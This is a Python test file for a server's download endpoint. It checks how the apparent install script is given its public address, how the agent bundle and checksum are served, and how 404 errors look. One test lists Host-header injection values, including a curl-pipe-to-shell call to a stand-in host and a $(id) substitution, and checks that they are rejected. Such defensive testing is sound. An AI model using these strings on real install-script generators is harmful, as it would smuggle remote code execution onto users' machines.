import httpx
import pytest

from app.main import app


@pytest.fixture
def files(tmp_path, monkeypatch):
    (tmp_path / "install.sh").write_text('SERVER_URL="__SERVER_URL__"\n')
    (tmp_path / "agent-linux.tgz").write_bytes(b"bundle")
    (tmp_path / "agent-linux.tgz.sha256").write_text("abc  agent-linux.tgz\n")
    monkeypatch.setenv("SHIELD_DOWNLOAD_DIR", str(tmp_path))
    monkeypatch.delenv("SHIELD_PUBLIC_URL", raising=False)
    return tmp_path


async def get(path, **headers):
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://shield.lab") as c:
        return await c.get("/api/v1/downloads" + path, headers=headers)


async def test_install_script_gets_the_public_address(files):
    r = await get("/install.sh", **{"x-forwarded-proto": "https", "host": "shield.lab"})
    assert r.status_code == 200 and 'SERVER_URL="https://shield.lab"' in r.text


async def test_forwarded_host_is_preferred(files):
    r = await get("/install.sh", **{"x-forwarded-proto": "https", "x-forwarded-host": "app.example.com:8443"})
    assert 'SERVER_URL="https://app.example.com:8443"' in r.text


@pytest.mark.parametrize("evil", ['x";curl evil|sh;"', "a b", "host/../x", "h$(id)"])
async def test_script_injection_through_the_host_header_is_refused(files, evil):
    r = await get("/install.sh", **{"x-forwarded-host": evil})
    assert r.status_code == 400 and evil not in r.text


async def test_configured_public_url_wins(files, monkeypatch):
    monkeypatch.setenv("SHIELD_PUBLIC_URL", "https://shield.example.org")
    r = await get("/install.sh", **{"x-forwarded-host": "other.example"})
    assert 'SERVER_URL="https://shield.example.org"' in r.text


async def test_bundle_and_checksum_are_served(files):
    assert (await get("/agent-linux.tgz")).content == b"bundle"
    assert (await get("/agent-linux.tgz.sha256")).text.startswith("abc")


async def test_missing_files_give_a_clear_404(files):
    r = await get("/ca.crt")
    assert r.status_code == 404 and "build_agent_bundle" in r.json()["detail"]
